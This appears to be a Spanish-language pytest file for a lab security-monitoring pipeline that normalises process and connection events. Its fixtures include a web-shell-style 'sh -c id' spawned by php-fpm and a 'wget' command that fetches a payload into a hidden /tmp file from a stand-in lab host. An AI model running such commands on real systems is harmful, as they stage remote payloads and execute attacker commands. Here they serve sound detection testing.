import pytest

from minisoc_ingesta.normalizar import EventoInvalido, Segmentos, ips_en, normalizar

SEG = Segmentos()
RECIBIDO = "2026-11-14T18:00:00.000Z"


def proceso(**datos):
    base = {"pid": 412, "ppid": 405, "proceso": "sh", "padre": "php-fpm",
            "cmdline": "sh -c id; sleep 1; true", "usuario": "nodo"}
    base.update(datos)
    return {"ts": "2026-11-14T17:59:59.500Z", "host": "web-01", "tipo": "proceso", "datos": base}


def conexion(**datos):
    base = {"direccion": "saliente", "ip_origen": "10.20.0.11", "puerto_origen": 55732,
            "ip_destino": "10.99.0.66", "puerto_destino": 80, "estado": "syn_enviado"}
    base.update(datos)
    return {"ts": "2026-11-14T17:59:59.500Z", "host": "web-01", "tipo": "conexion", "datos": base}


def test_proceso_mantiene_los_campos_del_contrato():
    e = normalizar(proceso(), "web-01", SEG, RECIBIDO)
    assert e["tipo"] == "proceso"
    assert e["ts"] == "2026-11-14T17:59:59.500Z"
    assert e["ts_recibido"] == RECIBIDO
    assert {"padre", "proceso", "cmdline", "usuario"} <= set(e["datos"])
    assert "ips_mencionadas" not in e["datos"]


def test_ip_dentro_del_comando_se_copia_a_un_campo_propio():
    # El agente solo deja bloquear IPs que estén solas en un campo.
    e = normalizar(proceso(proceso="wget", cmdline="wget -q -O /tmp/.x http://10.99.0.66/x"), "web-01", SEG, RECIBIDO)
    assert e["datos"]["ips_mencionadas"] == ["10.99.0.66"]
    assert e["datos"]["segmentos_mencionados"] == ["externo"]


def test_ips_en_ignora_versiones_y_numeros_invalidos():
    assert ips_en("python3.12.0.1 999.1.1.1 1.2.3.4 1.2.3.4") == ["1.2.3.4"]


def test_conexion_agrega_el_segmento_del_otro_extremo():
    assert normalizar(conexion(), "web-01", SEG, RECIBIDO)["datos"]["segmento_remoto"] == "externo"
    entrante = conexion(direccion="entrante", ip_origen="10.20.0.11", ip_destino="10.20.0.13", puerto_destino=22)
    entrante["host"] = "db-01"
    assert normalizar(entrante, "db-01", SEG, RECIBIDO)["datos"]["segmento_remoto"] == "servicios"


def test_ip_fuera_del_laboratorio():
    assert normalizar(conexion(ip_destino="1.1.1.1"), "web-01", SEG, RECIBIDO)["datos"]["segmento_remoto"] == "fuera_del_laboratorio"


def test_evento_no_puede_decir_que_viene_de_otro_host():
    with pytest.raises(EventoInvalido, match="otro|llegó del sensor"):
        normalizar(proceso(), "db-01", SEG, RECIBIDO)


@pytest.mark.parametrize("cambio", [
    {"pid": "412"}, {"pid": 0}, {"cmdline": 123}, {"usuario": None},
])
def test_proceso_invalido(cambio):
    with pytest.raises(EventoInvalido):
        normalizar(proceso(**cambio), "web-01", SEG, RECIBIDO)


@pytest.mark.parametrize("cambio", [
    {"ip_destino": "no-es-ip"}, {"puerto_destino": 70000}, {"estado": "cerrada"}, {"direccion": "lateral"},
])
def test_conexion_invalida(cambio):
    with pytest.raises(EventoInvalido):
        normalizar(conexion(**cambio), "web-01", SEG, RECIBIDO)


def test_ts_del_futuro_o_invalido_usa_el_de_recepcion():
    for ts in ("2099-01-01T00:00:00Z", "ayer", None, "2026-11-14T17:59:59"):  # el último sin zona
        ev = proceso()
        ev["ts"] = ts
        assert normalizar(ev, "web-01", SEG, RECIBIDO)["ts"] == RECIBIDO


def test_caracteres_de_control_y_textos_largos():
    e = normalizar(proceso(cmdline="sh -c 'echo\x1b[31m hola'" + "a" * 5000), "web-01", SEG, RECIBIDO)
    assert "\x1b" not in e["datos"]["cmdline"]
    assert len(e["datos"]["cmdline"]) == 2000
    assert e["datos"]["cmdline_truncada"] is True
